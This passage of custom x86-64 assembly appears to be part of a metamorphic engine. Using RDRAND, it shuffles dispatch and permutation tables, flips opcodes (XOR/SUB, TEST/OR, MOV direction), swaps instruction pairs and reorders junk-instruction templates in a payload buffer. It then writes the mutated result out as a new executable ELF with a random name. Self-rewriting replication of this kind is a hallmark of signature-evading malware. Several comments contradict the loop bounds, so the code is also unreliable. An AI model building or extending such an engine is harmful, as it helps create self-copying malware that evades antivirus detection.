    INC_REG        r8                       # divisor = i+1
    DIV_REG        r8                       # rdx = rax mod (i+1) = j
    
    # Swap perm[rcx] and perm[rdx]
    MOV_REG_REG    rsi, r14
    ADD_REG_IMM32  rsi, 0xD580
    ADD_REG_REG    rsi, rcx                # &perm[i]
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD580
    ADD_REG_REG    rdi, rdx                # &perm[j]
    MOV_REG_BYTE_MEM r9, [rsi]
    MOV_REG_BYTE_MEM r10, [rdi]
    MOV_BYTE_MEM_REG [rsi], r10
    MOV_BYTE_MEM_REG [rdi], r9
    
    DEC_REG        rcx
    JMP_REL8       FY
FY_DONE:

# Build new dispatch_table:
# for i in 0..8: new_dispatch[new_perm[i]] = scratch_dispatch[old_perm[i]]
MOV_REG_IMM8   rcx, 0                       # i
BD:
    CMP_REG_IMM8   rcx, 9
    JE_REL8        BD_DONE
    
    # Read new_perm[i]
    MOV_REG_REG    rsi, r14
    ADD_REG_IMM32  rsi, 0xD580
    ADD_REG_REG    rsi, rcx
    MOV_REG_BYTE_MEM rdx, [rsi]             # rdx = new_perm[i]
    
    # Read old_perm[i] from r12
    MOV_REG_REG    rsi, r12
    ADD_REG_REG    rsi, rcx
    MOV_REG_BYTE_MEM r8, [rsi]              # r8 = old_perm[i]
    
    # Read scratch_dispatch[old_perm[i]]
    MOV_REG_REG    rsi, r14
    ADD_REG_IMM32  rsi, 0xD500
    MOV_REG_REG    rax, r8
    IMUL_REG_IMM8  rax, 8
    ADD_REG_REG    rsi, rax
    MOV_REG_MEM    rax, [rsi]               # rax = handler self-relative offset
    
    # Compute &new_dispatch[new_perm[i]]
    MOV_REG_REG    rdi, r13
    MOV_REG_REG    r9, rdx
    IMUL_REG_IMM8  r9, 8
    ADD_REG_REG    rdi, r9
    MOV_MEM_REG    [rdi], rax
    
    INC_REG        rcx
    JMP_REL8       BD
BD_DONE:

# Write perm_table to ELF (copy r14+0xD580..D589 → r12)
MOV_REG_REG    rsi, r14
ADD_REG_IMM32  rsi, 0xD580
MOV_REG_REG    rdi, r12
MOV_REG_IMM8   rcx, 9
WP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        WP_DONE
    MOV_REG_BYTE_MEM rax, [rsi]
    MOV_BYTE_MEM_REG [rdi], rax
    INC_REG        rsi
    INC_REG        rdi
    DEC_REG        rcx
    JMP_REL8       WP
WP_DONE:

# === END Phase 4 ===

# === Phase 5 BYPASSED FOR DEBUG ===
# bypass removed
# === Phase 5: Opcode swaps + reorder pairs ===
# Scratch usage:
#   0xD230: swap_site_table addr
#   0xD238: reorder_pair_table addr
#   0xD240: site_addr saved for K2

# --- Resolve swap_site_table addr (idx 19, off 84) ---
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD220
MOV_REG_MEM    rax, [rdi]               # rax = anchor_addr
MOV_REG_REG    rsi, rax
ADD_REG_IMM8   rsi, DELTA_OFF_SWAP_SITE_TABLE
MOV_REG_DWORD_MEM rdx, [rsi]            # rdx = delta (32-bit, zero-ext)
ADD_REG_REG    rdx, rax                  # rdx = swap_table_addr
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD230
MOV_MEM_REG    [rdi], rdx

# --- Resolve reorder_pair_table addr (idx 20, off 88) ---
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD220
MOV_REG_MEM    rax, [rdi]
MOV_REG_REG    rsi, rax
ADD_REG_IMM8   rsi, DELTA_OFF_REORDER_TABLE
MOV_REG_DWORD_MEM rdx, [rsi]
ADD_REG_REG    rdx, rax
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD238
MOV_MEM_REG    [rdi], rdx

# === K1 LOOP: sites 0..8 (XOR <-> SUB) ===
MOV_REG_IMM8   rcx, 0
K1_LOOP_TOP:
    CMP_REG_IMM8   rcx, 9
    JE_REL8        K1_DONE

K1_COIN:
    RDRAND_REG     rax
    JNC_REL8       K1_COIN
    AND_REG_IMM8   rax, 1
    CMP_REG_IMM8   rax, 0
    JE_REL8        K1_NEXT

    # rsi = swap_table[rcx*8 + 2]
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD230
    MOV_REG_MEM    rsi, [rdi]
    MOV_REG_REG    rax, rcx
    IMUL_REG_IMM8  rax, 8
    ADD_REG_REG    rsi, rax
    ADD_REG_IMM8   rsi, 2
    MOV_REG_DWORD_MEM r9, [rsi]
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD220
    MOV_REG_MEM    rax, [rdi]
    ADD_REG_REG    r9, rax              # r9 = site_addr

    # If first byte is REX (0x40..0x4F), advance r9
    MOV_REG_BYTE_MEM r10, [r9]
    CMP_REG_IMM8   r10, 0x40
    JL_REL8        K1_DO_FLIP
    CMP_REG_IMM8   r10, 0x50
    JGE_REL8       K1_DO_FLIP
    INC_REG        r9
    MOV_REG_BYTE_MEM r10, [r9]
K1_DO_FLIP:
    XOR_REG_IMM8   r10, 0x18             # 0x31 <-> 0x29
    MOV_BYTE_MEM_REG [r9], r10

K1_NEXT:
    INC_REG        rcx
    JMP_REL8       K1_LOOP_TOP
K1_DONE:

# === K3 LOOP: sites 18..24 (TEST <-> OR) ===
MOV_REG_IMM8   rcx, 30
K3_LOOP_TOP:
    CMP_REG_IMM8   rcx, 38
    JE_REL8        K3_DONE

K3_COIN:
    RDRAND_REG     rax
    JNC_REL8       K3_COIN
    AND_REG_IMM8   rax, 1
    CMP_REG_IMM8   rax, 0
    JE_REL8        K3_NEXT

    # rsi = swap_table[rcx*8 + 2]
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD230
    MOV_REG_MEM    rsi, [rdi]
    MOV_REG_REG    rax, rcx
    IMUL_REG_IMM8  rax, 8
    ADD_REG_REG    rsi, rax
    ADD_REG_IMM8   rsi, 2
    MOV_REG_DWORD_MEM r9, [rsi]
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD220
    MOV_REG_MEM    rax, [rdi]
    ADD_REG_REG    r9, rax

    MOV_REG_BYTE_MEM r10, [r9]
    CMP_REG_IMM8   r10, 0x40
    JL_REL8        K3_DO_FLIP
    CMP_REG_IMM8   r10, 0x50
    JGE_REL8       K3_DO_FLIP
    INC_REG        r9
    MOV_REG_BYTE_MEM r10, [r9]
K3_DO_FLIP:
    XOR_REG_IMM8   r10, 0x8C             # 0x85 <-> 0x09
    MOV_BYTE_MEM_REG [r9], r10

K3_NEXT:
    INC_REG        rcx
    JMP_REL8       K3_LOOP_TOP
K3_DONE:

# === K2 LOOP: sites 9..17 (MOV direction toggle) ===
# All K2 sites are 64-bit reg-reg moves: REX + 0x89 + ModRM (mod=11).
MOV_REG_IMM8   rcx, 9
K2_LOOP_TOP:
    CMP_REG_IMM8   rcx, 30
    JE_REL8        K2_TR_DONE

K2_COIN:
    RDRAND_REG     rax
    JNC_REL8       K2_COIN
    AND_REG_IMM8   rax, 1
    CMP_REG_IMM8   rax, 0
    JE_REL8        K2_TR_NEXT

    # Load site_addr into r9
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD230
    MOV_REG_MEM    rsi, [rdi]
    MOV_REG_REG    rax, rcx
    IMUL_REG_IMM8  rax, 8
    ADD_REG_REG    rsi, rax
    ADD_REG_IMM8   rsi, 2
    MOV_REG_DWORD_MEM r9, [rsi]
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD220
    MOV_REG_MEM    rax, [rdi]
    ADD_REG_REG    r9, rax              # r9 = site_addr (REX byte position)

    # Save site_addr to scratch for later REX write
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD240
    MOV_MEM_REG    [rdi], r9
    JMP_REL8       K2_BODY

K2_TR_DONE:
    JMP_REL8       K2_TR_DONE_2
K2_TR_NEXT:
    JMP_REL8       K2_TR_NEXT_2

K2_BODY:
    JMP_REL8       K2_BODY_REAL
K2_TR_TOP_2:
    JMP_REL8       K2_LOOP_TOP
K2_BODY_REAL:
    # Read REX into r10
    MOV_REG_BYTE_MEM r10, [r9]
    INC_REG        r9                    # r9 -> opcode
    # Toggle opcode (0x89 <-> 0x8B)
    MOV_REG_BYTE_MEM r11, [r9]
    XOR_REG_IMM8   r11, 0x02
    MOV_BYTE_MEM_REG [r9], r11
    INC_REG        r9                    # r9 -> ModRM
    # Read ModRM
    MOV_REG_BYTE_MEM r11, [r9]

    # Save loop counter (rcx) on stack; will be clobbered by DIV
    PUSH_REG       rcx

    # === Compute new ModRM = (m & 0xC0) | ((m & 7) << 3) | ((m >> 3) & 7) ===
    # Step A: rax = m & 0xC0  (mod bits)
    MOV_REG_REG    rax, r11
    AND_REG_IMM8   rax, 0xC0
    PUSH_REG       rax                   # save mod

    # Step B: rax = (m & 7) << 3
    MOV_REG_REG    rax, r11
    AND_REG_IMM8   rax, 7
    IMUL_REG_IMM8  rax, 8
    PUSH_REG       rax                   # save (rm<<3)

    # Step C: rax = (m & 0x38) / 8 = reg field
    MOV_REG_REG    rax, r11
    AND_REG_IMM8   rax, 0x38
    XOR_REG_REG    rdx, rdx
    MOV_REG_IMM8   rcx, 8
    DIV_REG        rcx                   # rax = reg, rdx = 0

    POP_REG        rcx                   # rcx = (rm<<3)
    ADD_REG_REG    rax, rcx               # rax = (rm<<3) + reg
    POP_REG        rcx                   # rcx = mod
    ADD_REG_REG    rax, rcx               # rax = full new ModRM

    # Write new ModRM byte
    MOV_BYTE_MEM_REG [r9], rax

    JMP_REL8       K2_REX_PART
K2_TR_DONE_2:
    JMP_REL8       K2_DONE
K2_TR_NEXT_2:
    JMP_REL8       K2_NEXT
K2_TR_TOP_3:
    JMP_REL8       K2_TR_TOP_2

K2_REX_PART:
    # === Compute new REX from r10 ===
    # new_rex = (r10 & 0xFA) | ((r10 >> 2) & 1) | ((r10 & 1) << 2)
    MOV_REG_REG    rax, r10
    AND_REG_IMM8   rax, 0xFA              # clear bit 0 (B) and bit 2 (R)
    PUSH_REG       rax                    # save base

    # (r10 >> 2) & 1 — extract old R bit
    MOV_REG_REG    rax, r10
    AND_REG_IMM8   rax, 0x04
    XOR_REG_REG    rdx, rdx
    MOV_REG_IMM8   rcx, 4
    DIV_REG        rcx                    # rax = R bit at pos 0
    PUSH_REG       rax

    # (r10 & 1) << 2 — extract old B bit, shift to pos 2
    MOV_REG_REG    rax, r10
    AND_REG_IMM8   rax, 0x01
    IMUL_REG_IMM8  rax, 4

    POP_REG        rcx                    # rcx = new B (was R)
    ADD_REG_REG    rax, rcx                # combine new R/B
    POP_REG        rcx                    # rcx = base
    ADD_REG_REG    rax, rcx                # full new REX

    # Restore site_addr from scratch
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD240
    MOV_REG_MEM    r9, [rdi]              # r9 = REX position again

    # Write new REX
    MOV_BYTE_MEM_REG [r9], rax

    # Restore loop counter
    POP_REG        rcx

K2_NEXT:
    INC_REG        rcx
    JMP_REL8       K2_TR_TOP_3

K2_DONE:

# === REORDER LOOP: pairs 0..6 ===
MOV_REG_IMM8   rcx, 0
RE_LOOP_TOP:
    CMP_REG_IMM8   rcx, 7
    JE_REL8        RE_DONE

RE_COIN:
    RDRAND_REG     rax
    JNC_REL8       RE_COIN
    AND_REG_IMM8   rax, 1
    CMP_REG_IMM8   rax, 0
    JE_REL8        RE_TR_NEXT

    # rsi = reorder_table[rcx*8]
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD238
    MOV_REG_MEM    rsi, [rdi]
    MOV_REG_REG    rax, rcx
    IMUL_REG_IMM8  rax, 8
    ADD_REG_REG    rsi, rax

    # half_size at byte 0
    MOV_REG_BYTE_MEM r8, [rsi]            # r8 = half_size
    # delta at +4
    ADD_REG_IMM8   rsi, 4
    MOV_REG_DWORD_MEM r9, [rsi]
    MOV_REG_REG    rdi, r14
    ADD_REG_IMM32  rdi, 0xD220
    MOV_REG_MEM    rax, [rdi]
    ADD_REG_REG    r9, rax                # r9 = pair_a addr

    # rdi = pair_b addr = r9 + r8
    MOV_REG_REG    rdi, r9
    ADD_REG_REG    rdi, r8
    # rdx = remaining bytes to swap = r8
    MOV_REG_REG    rdx, r8

    PUSH_REG       rcx                    # save loop counter
RE_SWAP_BYTES:
    CMP_REG_IMM8   rdx, 0
    JE_REL8        RE_SWAP_DONE
    MOV_REG_BYTE_MEM r10, [r9]
    MOV_REG_BYTE_MEM r11, [rdi]
    MOV_BYTE_MEM_REG [r9], r11
    MOV_BYTE_MEM_REG [rdi], r10
    INC_REG        r9
    INC_REG        rdi
    DEC_REG        rdx
    JMP_REL8       RE_SWAP_BYTES
RE_SWAP_DONE:
    POP_REG        rcx

    JMP_REL8       RE_NEXT
RE_TR_NEXT:
    JMP_REL8       RE_NEXT
RE_NEXT:
    INC_REG        rcx
    JMP_REL8       RE_LOOP_TOP
RE_DONE:

# === END Phase 5 ===

PHASE_5_BYPASS_T2:

# === Phase 6: Shuffle INIT_OP table ===
# table consists of 36 blocks, 37 bytes each
# i loop from 35 down to 1
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD220
MOV_REG_MEM    rbx, [rdi]                 # rbx = anchor_addr
ADD_REG_IMM8   rbx, DELTA_OFF_INIT_OP_TABLE
MOV_REG_DWORD_MEM rdx, [rbx]
MOV_REG_REG    rbx, r14
ADD_REG_IMM32  rbx, 0xD220
MOV_REG_MEM    rbx, [rbx]
ADD_REG_REG    rbx, rdx                   # rbx = real address of init_op_table in our mutated buffer
# Note: rbx is in the payload execution scope, but wait, we need to mutate the child's payload buffer at `r14 + 0xB000 + delta_to_anchor + rdx`?
# NO, we don't shuffle it in-place in our memory (that's read-only maybe or executable?), we ALWAYS shuffle it in the newly generated `mutated payload buf` mapping.
# Ah! In Phase 5, we read from anchor_addr (the newly constructed payload starting at r14 + 0xB000 + offset_to_anchor).
# Let's check how Phase 5 gets the address:
# MOV_REG_REG    rdi, r14
# ADD_REG_IMM32  rdi, 0xD220
# MOV_REG_MEM    rax, [rdi]               # rax = anchor_addr (in mutated buffer!)
# So rbx is indeed the init_op_table in the mutated buffer!

MOV_REG_IMM8   rcx, 35                    # rcx = i
SHUFFLE_INIT_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        SHUFFLE_INIT_DONE
    
SHUFFLE_INIT_RDRAND:
    RDRAND_REG     rax
    JNC_REL8       SHUFFLE_INIT_RDRAND
    
    MOV_REG_REG    r10, rcx
    INC_REG        r10                    # modulus r10 = rcx + 1
    XOR_REG_REG    rdx, rdx               # zero rdx
    DIV_REG        r10                    # RDX:RAX / r10 -> remainder j goes to rdx
    
    # Compute pointers
    MOV_REG_REG    r8, rcx
    IMUL_REG_IMM8  r8, 37
    ADD_REG_REG    r8, rbx                # r8 = rbx + i * 37
    
    MOV_REG_REG    r9, rdx
    IMUL_REG_IMM8  r9, 37
    ADD_REG_REG    r9, rbx                # r9 = rbx + j * 37
    
    MOV_REG_IMM8   r10, 37                # length of block to swap
SHUFFLE_INIT_SWAP:
    CMP_REG_IMM8   r10, 0
    JE_REL8        SHUFFLE_INIT_NEXT
    
    MOV_REG_BYTE_MEM r11, [r8]
    MOV_REG_BYTE_MEM r12, [r9]
    MOV_BYTE_MEM_REG [r8], r12
    MOV_BYTE_MEM_REG [r9], r11
    
    INC_REG        r8
    INC_REG        r9
    DEC_REG        r10
    JMP_REL8       SHUFFLE_INIT_SWAP

SHUFFLE_INIT_NEXT:
    DEC_REG        rcx
    JMP_REL8       SHUFFLE_INIT_LOOP

SHUFFLE_INIT_DONE:

# === Phase 7: Shuffle swap_site_table ===
# Break into 3 buckets to respect Phase 5 static indices logic:
# K1: 0..8 (9 entries)
# K2: 9..17 (9 entries)
# K3: 18..24 (7 entries)

MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD220
MOV_REG_MEM    rbx, [rdi]                 # rbx = anchor_addr
ADD_REG_IMM8   rbx, DELTA_OFF_SWAP_SITE_TABLE
MOV_REG_DWORD_MEM rdx, [rbx]
MOV_REG_REG    rbx, r14
ADD_REG_IMM32  rbx, 0xD220
MOV_REG_MEM    rbx, [rbx]
ADD_REG_REG    rbx, rdx                   # rbx = address of swap_site_table in mutated buffer

# Bucket 1: 0..8 (i from 8 down to 1)
MOV_REG_IMM8   rcx, 8
SHUFFLE_SWAP_B1_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        SHUFFLE_SWAP_B1_DONE
    
SHUFFLE_SWAP_B1_RDRAND:
    RDRAND_REG     rax
    JNC_REL8       SHUFFLE_SWAP_B1_RDRAND
    
    MOV_REG_REG    r10, rcx
    INC_REG        r10                    # modulus r10 = rcx + 1
    XOR_REG_REG    rdx, rdx               # zero rdx
    DIV_REG        r10                    # remainder j goes to rdx
    
    MOV_REG_REG    r8, rcx
    IMUL_REG_IMM8  r8, 8
    ADD_REG_REG    r8, rbx                # r8 = rbx + i * 8
    
    MOV_REG_REG    r9, rdx
    IMUL_REG_IMM8  r9, 8
    ADD_REG_REG    r9, rbx                # r9 = rbx + j * 8
    
    MOV_REG_MEM    r11, [r8]
    MOV_REG_MEM    r12, [r9]
    MOV_MEM_REG    [r8], r12
    MOV_MEM_REG    [r9], r11
    
    DEC_REG        rcx
    JMP_REL8       SHUFFLE_SWAP_B1_LOOP
SHUFFLE_SWAP_B1_DONE:

# Bucket 2: 9..17 (i from 17 down to 10)
MOV_REG_IMM8   rcx, 29
SHUFFLE_SWAP_B2_LOOP:
    CMP_REG_IMM8   rcx, 9
    JE_REL8        SHUFFLE_SWAP_B2_DONE
    
SHUFFLE_SWAP_B2_RDRAND:
    RDRAND_REG     rax
    JNC_REL8       SHUFFLE_SWAP_B2_RDRAND
    
    MOV_REG_REG    r10, rcx
    MOV_REG_IMM8   r11, 8
    SUB_REG_REG    r10, r11               # modulus r10 = (i - 9) + 1 = i - 8
    XOR_REG_REG    rdx, rdx
    DIV_REG        r10                    # remainder j_offset in rdx
    ADD_REG_IMM8   rdx, 9                 # j = j_offset + 9
    
    MOV_REG_REG    r8, rcx
    IMUL_REG_IMM8  r8, 8
    ADD_REG_REG    r8, rbx                # r8 = rbx + i * 8
    
    MOV_REG_REG    r9, rdx
    IMUL_REG_IMM8  r9, 8
    ADD_REG_REG    r9, rbx                # r9 = rbx + j * 8
    
    MOV_REG_MEM    r11, [r8]
    MOV_REG_MEM    r12, [r9]
    MOV_MEM_REG    [r8], r12
    MOV_MEM_REG    [r9], r11
    
    DEC_REG        rcx
    JMP_REL8       SHUFFLE_SWAP_B2_LOOP
SHUFFLE_SWAP_B2_DONE:

# Bucket 3: 18..24 (i from 24 down to 19)
MOV_REG_IMM8   rcx, 37
SHUFFLE_SWAP_B3_LOOP:
    CMP_REG_IMM8   rcx, 30
    JE_REL8        SHUFFLE_SWAP_B3_DONE
    
SHUFFLE_SWAP_B3_RDRAND:
    RDRAND_REG     rax
    JNC_REL8       SHUFFLE_SWAP_B3_RDRAND
    
    MOV_REG_REG    r10, rcx
    MOV_REG_IMM8   r11, 29
    SUB_REG_REG    r10, r11               # modulus r10 = (i - 30) + 1 = i - 29
    XOR_REG_REG    rdx, rdx
    DIV_REG        r10                    # remainder j_offset in rdx
    ADD_REG_IMM8   rdx, 30                # j = j_offset + 30
    
    MOV_REG_REG    r8, rcx
    IMUL_REG_IMM8  r8, 8
    ADD_REG_REG    r8, rbx                # r8 = rbx + i * 8
    
    MOV_REG_REG    r9, rdx
    IMUL_REG_IMM8  r9, 8
    ADD_REG_REG    r9, rbx                # r9 = rbx + j * 8
    
    MOV_REG_MEM    r11, [r8]
    MOV_REG_MEM    r12, [r9]
    MOV_MEM_REG    [r8], r12
    MOV_MEM_REG    [r9], r11
    
    DEC_REG        rcx
    JMP_REL8       SHUFFLE_SWAP_B3_LOOP
SHUFFLE_SWAP_B3_DONE:

# === Phase 8: Shuffle reorder_pair_table ===
# 7 entries, 8 bytes each
# Loop i from 6 down to 1
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD220
MOV_REG_MEM    rbx, [rdi]                 # rbx = anchor_addr
ADD_REG_IMM8   rbx, DELTA_OFF_REORDER_TABLE
MOV_REG_DWORD_MEM rdx, [rbx]
MOV_REG_REG    rbx, r14
ADD_REG_IMM32  rbx, 0xD220
MOV_REG_MEM    rbx, [rbx]
ADD_REG_REG    rbx, rdx                   # rbx = address of reorder table

MOV_REG_IMM8   rcx, 6
SHUFFLE_REORDER_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        SHUFFLE_REORDER_DONE
    
SHUFFLE_REORDER_RDRAND:
    RDRAND_REG     rax
    JNC_REL8       SHUFFLE_REORDER_RDRAND
    
    MOV_REG_REG    r10, rcx
    INC_REG        r10                    # modulus r10 = rcx + 1
    XOR_REG_REG    rdx, rdx               # zero rdx
    DIV_REG        r10                    # remainder j goes to rdx
    
    MOV_REG_REG    r8, rcx
    IMUL_REG_IMM8  r8, 8
    ADD_REG_REG    r8, rbx                # r8 = rbx + i * 8
    
    MOV_REG_REG    r9, rdx
    IMUL_REG_IMM8  r9, 8
    ADD_REG_REG    r9, rbx                # r9 = rbx + j * 8
    
    MOV_REG_MEM    r11, [r8]
    MOV_REG_MEM    r12, [r9]
    MOV_MEM_REG    [r8], r12
    MOV_MEM_REG    [r9], r11
    
    DEC_REG        rcx
    JMP_REL8       SHUFFLE_REORDER_LOOP
SHUFFLE_REORDER_DONE:

# === Phase 9: Shuffle junk templates table ===
# 19 entries, 16 bytes each
# Loop i from 18 down to 1
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD220
MOV_REG_MEM    rbx, [rdi]                 # rbx = anchor_addr
MOV_REG_REG    rax, rbx
ADD_REG_IMM8   rax, DELTA_OFF_JUNK_TEMPLATES
MOV_REG_DWORD_MEM rdx, [rax]
ADD_REG_REG    rbx, rdx                   # rbx = address of junk templates table

MOV_REG_IMM8   rcx, 18
SHUFFLE_JUNK_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        SHUFFLE_JUNK_DONE
    
SHUFFLE_JUNK_RDRAND:
    RDRAND_REG     rax
    JNC_REL8       SHUFFLE_JUNK_RDRAND
    
    MOV_REG_REG    r10, rcx
    INC_REG        r10                    # modulus r10 = rcx + 1
    XOR_REG_REG    rdx, rdx               # zero rdx
    DIV_REG        r10                    # remainder j goes to rdx
    
    MOV_REG_REG    r8, rcx
    IMUL_REG_IMM8  r8, 16
    ADD_REG_REG    r8, rbx                # r8 = rbx + i * 16
    
    MOV_REG_REG    r9, rdx
    IMUL_REG_IMM8  r9, 16
    ADD_REG_REG    r9, rbx                # r9 = rbx + j * 16
    
    # Swap first 8 bytes
    MOV_REG_MEM    r11, [r8]
    MOV_REG_MEM    r12, [r9]
    MOV_MEM_REG    [r8], r12
    MOV_MEM_REG    [r9], r11
    
    # Swap next 8 bytes
    MOV_REG_REG    r10, r8
    ADD_REG_IMM8   r10, 8
    MOV_REG_REG    r11, r9
    ADD_REG_IMM8   r11, 8
    MOV_REG_MEM    r12, [r10]
    MOV_REG_MEM    r13, [r11]
    MOV_MEM_REG    [r10], r13
    MOV_MEM_REG    [r11], r12
    
    DEC_REG        rcx
    JMP_REL8       SHUFFLE_JUNK_LOOP
SHUFFLE_JUNK_DONE:

# Section 9 - Generate filename, write child ELF, chmod, exit
# Build 8-char random filename at r14+0xD100
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD100
MOV_REG_IMM8   rcx, 8

GEN_FILENAME_LOOP:
    CMP_REG_IMM8   rcx, 0
    JE_REL8        GEN_FILENAME_DONE

REGEN_CHAR:
    RDRAND_REG     rax
    JNC_REL8       REGEN_CHAR
    AND_REG_IMM8   rax, 0x3F
    CMP_REG_IMM8   rax, 52
    JGE_REL8       REGEN_CHAR
    CMP_REG_IMM8   rax, 26
    JL_REL8        IS_UPPER
    ADD_REG_IMM8   rax, 71          # lowercase: val + 71 = 'a' + (val-26)
    JMP_REL8       STORE_CHAR

IS_UPPER:
    ADD_REG_IMM8   rax, 65          # uppercase: val + 65 = 'A' + val

STORE_CHAR:
    MOV_BYTE_MEM_REG  [rdi], rax
    INC_REG        rdi
    DEC_REG        rcx
    JMP_REL8       GEN_FILENAME_LOOP

GEN_FILENAME_DONE:
    MOV_REG_IMM8   rax, 0
    MOV_BYTE_MEM_REG  [rdi], rax   # null terminator

# sys_open(filename, O_WRONLY|O_CREAT|O_TRUNC=577, 0755=0x1ED)
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD100
MOV_REG_IMM8   rax, 2
MOV_REG_IMM    rsi, 577            # O_WRONLY(1)|O_CREAT(0x40)|O_TRUNC(0x200)
MOV_REG_IMM    rdx, 0x1ED          # 0755 octal
SYSCALL
MOV_REG_REG    r9, rax             # r9 = output fd

# sys_write(fd, elf_buf, elf_size)
MOV_REG_IMM8   rax, 1
MOV_REG_REG    rdi, r9
MOV_REG_REG    rsi, r14
ADD_REG_IMM32  rsi, 0x3000
MOV_REG_REG    rdx, r14
ADD_REG_IMM32  rdx, 0xD200
MOV_REG_MEM    rdx, [rdx]          # rdx = elf_size from scratch
SYSCALL

# sys_close(fd)
MOV_REG_IMM8   rax, 3
MOV_REG_REG    rdi, r9
SYSCALL

# sys_chmod(filename, 0755)
MOV_REG_IMM8   rax, 90
MOV_REG_REG    rdi, r14
ADD_REG_IMM32  rdi, 0xD100
MOV_REG_IMM    rsi, 0x1ED
SYSCALL

# sys_exit(0)
MOV_REG_IMM8   rax, 60
XOR_REG_REG    rdi, rdi
SYSCALL

